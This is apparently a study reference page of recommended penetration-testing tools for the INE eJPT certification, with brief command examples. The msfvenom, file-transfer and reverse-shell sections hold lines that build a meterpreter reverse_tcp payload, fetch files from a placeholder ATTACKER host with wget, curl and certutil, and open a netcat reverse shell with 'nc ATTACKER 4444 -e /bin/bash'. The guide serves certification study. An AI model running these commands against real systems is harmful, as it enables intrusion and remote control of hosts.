# Recommended Tools

Choosing the right tools is essential for becoming an efficient penetration tester. While no single tool can perform every task, mastering a core toolkit will allow you to perform complete penetration tests, from reconnaissance to post-exploitation.

This page lists the most useful tools for the **INE eJPT** certification and serves as a long-term reference for future certifications such as **eCPPT**, **PNPT**, and **OSCP**.

---

# Operating Systems

## Kali Linux

The most widely used penetration testing distribution.

### Features

- 600+ security tools
- Pre-configured environment
- Frequent updates
- Excellent community support

Used for:

- Enumeration
- Exploitation
- Password attacks
- Web testing
- Wireless security

---

## Parrot Security OS

A lightweight alternative to Kali Linux.

Features:

- Lower resource usage
- Privacy-focused
- Similar toolset
- Great for laptops

---

# Reconnaissance

## Nmap

The industry-standard network scanner.

Used for:

- Host Discovery
- Port Scanning
- Service Detection
- OS Detection
- NSE Scripts

Examples:

```bash
nmap -sV TARGET

nmap -A TARGET

nmap -Pn TARGET
```

---

## RustScan

Ultra-fast port scanner.

Useful for quickly identifying open ports before running Nmap.

Example:

```bash
rustscan -a TARGET
```

---

## Masscan

High-speed internet-scale port scanner.

Best suited for:

- Large networks
- Internal assessments
- Fast reconnaissance

---

# Web Enumeration

## Gobuster

Brute-force directories, files, DNS, and virtual hosts.

Example:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

---

## Feroxbuster

A modern recursive content discovery tool.

Advantages:

- Recursive scanning
- Faster than Gobuster
- Excellent output formatting

---

## Wfuzz

Flexible web fuzzing tool.

Useful for:

- Parameters
- Directories
- Virtual Hosts
- Authentication

---

## Nikto

Web vulnerability scanner.

Detects:

- Dangerous files
- Outdated software
- Misconfigurations
- Default credentials

---

# DNS

## Dig

DNS lookup utility.

Examples:

```bash
dig TARGET

dig axfr TARGET @DNS_SERVER
```

---

## DNSRecon

Automated DNS enumeration.

Supports:

- Zone transfers
- Subdomain enumeration
- Reverse lookups

---

# Web Proxy

## Burp Suite Community Edition

One of the most important tools for web penetration testing.

Features:

- Proxy
- Repeater
- Intruder (limited)
- Decoder
- Comparer

Used extensively during the eJPT.

---

## OWASP ZAP

Excellent free alternative to Burp Suite.

Supports:

- Automated scans
- Manual testing
- Spidering

---

# Password Attacks

## Hydra

Online password brute forcing.

Protocols:

- SSH
- FTP
- SMB
- RDP
- HTTP
- HTTPS
- MySQL

---

## John the Ripper

Offline password cracking.

Supports:

- NTLM
- SHA
- MD5
- ZIP
- Office
- Linux hashes

---

## Hashcat

GPU-accelerated password cracking.

Best for:

- Large wordlists
- Rule-based attacks
- Mask attacks

---

# Exploitation

## Metasploit Framework

The most popular exploitation framework.

Capabilities:

- Exploits
- Auxiliary modules
- Payload generation
- Meterpreter
- Post-exploitation

---

## Msfvenom

Payload generation utility.

Example:

```bash
msfvenom \
-p windows/x64/meterpreter/reverse_tcp \
LHOST=ATTACKER \
LPORT=4444 \
-f exe \
-o shell.exe
```

---

## SearchSploit

Search the Exploit-DB database locally.

Example:

```bash
searchsploit apache
```

---

# SMB

## smbclient

Access SMB shares.

Example:

```bash
smbclient -L //TARGET
```

---

## enum4linux

Classic SMB enumeration tool.

Collects:

- Users
- Shares
- Password policy
- Groups

---

## CrackMapExec (NetExec)

One of the most useful Windows enumeration tools.

Supports:

- SMB
- WinRM
- SSH
- LDAP
- RDP

Example:

```bash
netexec smb TARGET
```

---

# SNMP

## snmpwalk

Enumerate SNMP services.

Example:

```bash
snmpwalk \
-v2c \
-c public \
TARGET
```

---

# Database

## sqlmap

Automated SQL Injection tool.

Capabilities:

- Database enumeration
- Credential dumping
- File reading
- Command execution (where applicable)

---

# File Transfers

## Python HTTP Server

Quickly host files.

```bash
python3 -m http.server 8000
```

---

## wget

Linux file download.

```bash
wget http://ATTACKER/file
```

---

## curl

Download files and interact with web APIs.

```bash
curl http://ATTACKER/file -o file
```

---

## certutil

Windows file download.

```cmd
certutil -urlcache -f http://ATTACKER/file.exe file.exe
```

---

# Packet Analysis

## Wireshark

Industry-standard packet analyzer.

Useful for:

- HTTP
- DNS
- SMB
- FTP
- TCP
- UDP
- ICMP

---

## tcpdump

Command-line packet capture.

Example:

```bash
tcpdump -i eth0
```

---

# Reverse Shells

## Netcat

The Swiss Army Knife of networking.

Listener:

```bash
nc -lvnp 4444
```

Reverse shell:

```bash
nc ATTACKER 4444 -e /bin/bash
```

---

## Socat

Advanced replacement for Netcat.

Supports:

- Encrypted tunnels
- TTY upgrades
- Port forwarding

---

# Linux Enumeration

## LinPEAS

Automated Linux privilege escalation enumeration.

Checks:

- SUID
- Capabilities
- Cron jobs
- Writable files
- Credentials

---

## pspy

Monitor processes without root privileges.

Useful for finding:

- Cron jobs
- Scheduled tasks
- Running scripts

---

# Windows Enumeration

## WinPEAS

Automated Windows privilege escalation enumeration.

Checks:

- Services
- Registry
- Tokens
- Scheduled Tasks
- Credentials
- Permissions

---

## Seatbelt

Windows host enumeration.

Useful for:

- Installed software
- Security settings
- Users
- Services

---

# Active Directory

## BloodHound

Visualize Active Directory attack paths.

Useful after eJPT when studying:

- PNPT
- eCPPT
- CRTO
- OSCP

---

# Reporting

## CherryTree

Excellent note-taking application.

Perfect for:

- Commands
- Screenshots
- Credentials
- Enumeration notes

---

## Obsidian

Markdown knowledge base.

Ideal for:

- Personal notes
- Writeups
- Documentation
- Long-term knowledge management

---

# VPN

## OpenVPN

Used by:

- INE
- Hack The Box
- Proving Grounds
- VulnHub

---

## WireGuard

Modern VPN protocol.

Advantages:

- Faster
- Simpler
- More secure
- Lightweight

---

# Essential eJPT Toolkit

If you could only learn a handful of tools before taking the **eJPT**, focus on these:

- Nmap
- Gobuster
- Burp Suite
- Hydra
- John the Ripper
- Metasploit
- Msfvenom
- SearchSploit
- smbclient
- enum4linux
- NetExec
- sqlmap
- Wireshark
- Netcat
- LinPEAS
- WinPEAS
- Python HTTP Server

Mastering these tools will cover the vast majority of techniques required during the **INE eJPT** exam and provide a solid foundation for more advanced offensive security certifications.
